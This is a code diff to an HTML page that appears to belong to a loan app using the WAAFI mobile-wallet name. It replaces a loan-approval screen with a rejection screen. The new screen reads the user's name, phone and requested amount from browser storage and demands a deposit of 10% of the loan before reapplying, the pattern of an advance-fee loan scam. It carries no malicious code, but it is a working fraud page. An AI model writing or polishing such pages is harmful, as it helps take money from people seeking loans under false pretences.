@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Success!</title>
+  <title>Application Rejected</title>
   <style>
     * {
       margin: 0;
@@ -35,24 +35,24 @@
       100% { opacity: 1; transform: translateY(0); }
     }
 
-    /* Checkmark animation */
-    .checkmark {
+    /* Warning icon animation */
+    .warning-icon {
       width: 80px;
       height: 80px;
       border-radius: 50%;
-      background: #34c759;
+      background: #ff3b30;
       display: flex;
       align-items: center;
       justify-content: center;
       margin: 0 auto 20px;
-      box-shadow: 0 8px 24px rgba(52, 199, 89, 0.3);
+      box-shadow: 0 8px 24px rgba(255, 59, 48, 0.3);
       animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
     @keyframes popIn {
       0% { transform: scale(0.5); opacity: 0; }
       100% { transform: scale(1); opacity: 1; }
     }
-    .checkmark svg {
+    .warning-icon svg {
       width: 44px;
       height: 44px;
       fill: none;
@@ -74,12 +74,16 @@
       margin-bottom: 24px;
       line-height: 1.5;
     }
+    .subtitle strong {
+      color: #ff3b30;
+      font-weight: 600;
+    }
 
     .user-card {
       background: #f8f8fc;
       border-radius: 16px;
       padding: 16px 20px;
-      margin-bottom: 28px;
+      margin-bottom: 16px;
       text-align: left;
       border: 1px solid #e8e8f0;
     }
@@ -96,6 +100,62 @@
     .user-card .row .value {
       color: #1c1c1e;
       font-weight: 600;
+    }
+
+    .reason-box {
+      background: #fde7e7;
+      border: 1px solid #f5c6cb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    .reason-box .reason-title {
+      font-weight: 600;
+      color: #b00020;
+      font-size: 14px;
+      margin-bottom: 4px;
+    }
+    .reason-box .reason-text {
+      font-size: 14px;
+      color: #1c1c1e;
+      line-height: 1.6;
+    }
+    .reason-box .reason-text .highlight {
+      font-weight: 700;
+      color: #b00020;
+    }
+
+    .deposit-box {
+      background: #e8f0fe;
+      border: 1px solid #bbd4f0;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .deposit-box .deposit-title {
+      font-weight: 600;
+      color: #007AFF;
+      font-size: 14px;
+      margin-bottom: 4px;
+    }
+    .deposit-box .deposit-text {
+      font-size: 14px;
+      color: #1c1c1e;
+      line-height: 1.6;
+    }
+    .deposit-box .deposit-amount {
+      display: block;
+      font-size: 22px;
+      font-weight: 700;
+      color: #007AFF;
+      text-align: center;
+      margin: 6px 0;
+      padding: 8px;
+      background: #ffffff;
+      border-radius: 8px;
+      border: 1px solid #bbd4f0;
     }
 
     .btn {
@@ -136,13 +196,16 @@
       .title {
         font-size: 24px;
       }
-      .checkmark {
+      .warning-icon {
         width: 72px;
         height: 72px;
       }
-      .checkmark svg {
+      .warning-icon svg {
         width: 38px;
         height: 38px;
+      }
+      .deposit-box .deposit-amount {
+        font-size: 18px;
       }
     }
   </style>
@@ -150,17 +213,21 @@
 <body>
 
 <div class="container">
-  <!-- Animated checkmark -->
-  <div class="checkmark">
+  <!-- Warning icon (X mark) -->
+  <div class="warning-icon">
     <svg viewBox="0 0 24 24">
-      <polyline points="20 6 9 17 4 12" />
+      <line x1="18" y1="6" x2="6" y2="18" />
+      <line x1="6" y1="6" x2="18" y2="18" />
     </svg>
   </div>
 
-  <div class="title">Success!</div>
-  <div class="subtitle">Your loan has been approved.<br />You can now access your funds.</div>
+  <div class="title">Application Rejected</div>
+  <div class="subtitle">
+    Your loan application could not be approved at this time.<br />
+    <strong>Reason:</strong> Insufficient wallet balance.
+  </div>
 
-  <!-- User details (from localStorage) -->
+  <!-- User details from localStorage -->
   <div class="user-card" id="userCard">
     <div class="row">
       <span class="label">Name</span>
@@ -171,13 +238,39 @@
       <span class="value" id="displayPhone">—</span>
     </div>
     <div class="row">
+      <span class="label">Requested</span>
+      <span class="value" id="loanAmountDisplay">—</span>
+    </div>
+    <div class="row">
       <span class="label">Status</span>
-      <span class="value" style="color:#34c759;">✅ Approved</span>
+      <span class="value" style="color:#ff3b30;">❌ Rejected</span>
     </div>
   </div>
 
-  <!-- Continue button -->
-  <button class="btn" id="continueBtn">Continue</button>
+  <!-- Rejection reason -->
+  <div class="reason-box">
+    <div class="reason-title">⛔ Rejection Reason</div>
+    <div class="reason-text">
+      To be approved for a loan, you must have at least 
+      <span class="highlight" id="requiredAmount">—</span> 
+      (10% of your requested loan amount) in your wallet.
+    </div>
+  </div>
+
+  <!-- Deposit instruction -->
+  <div class="deposit-box">
+    <div class="deposit-title">💳 Action Required</div>
+    <div class="deposit-text">
+      Please deposit the required amount below to your WAAFI wallet and reapply.
+    </div>
+    <span class="deposit-amount" id="depositAmount">—</span>
+    <div class="deposit-text" style="font-size: 13px; color: #6c6c70; margin-top: 4px;">
+      After depositing, click the button below to try again.
+    </div>
+  </div>
+
+  <!-- Try Again button -->
+  <button class="btn" id="tryAgainBtn">Try Again</button>
 
   <div class="version-footer">Version 12.4.0892 (1200040892)</div>
 </div>
@@ -187,14 +280,26 @@
     // Retrieve user data from localStorage
     const name = localStorage.getItem('fullName') || localStorage.getItem('name') || 'WAAFI User';
     const phone = localStorage.getItem('phone') || '—';
+    const loanAmount = localStorage.getItem('loanAmount') || '0';
 
     document.getElementById('displayName').textContent = name;
     document.getElementById('displayPhone').textContent = phone;
 
-    // Handle continue button – redirect to loan calculator (or any page you prefer)
-    document.getElementById('continueBtn').addEventListener('click', function() {
-      // You can change this URL to wherever you want users to go after success
-      window.location.href = 'loan.html';
+    // Calculate 10% of the loan amount
+    const amount = parseFloat(loanAmount) || 0;
+    const tenPercent = amount * 0.1;
+
+    // Format as USD
+    const formattedAmount = '$' + Number(amount).toLocaleString('en-US');
+    const formattedRequired = '$' + Number(tenPercent).toLocaleString('en-US');
+
+    document.getElementById('loanAmountDisplay').textContent = formattedAmount;
+    document.getElementById('requiredAmount').textContent = formattedRequired;
+    document.getElementById('depositAmount').textContent = formattedRequired;
+
+    // Handle Try Again button – redirect to loan calculator
+    document.getElementById('tryAgainBtn').addEventListener('click', function() {
+      window.location.href = 'index.html';
     });
   })();
 </script>
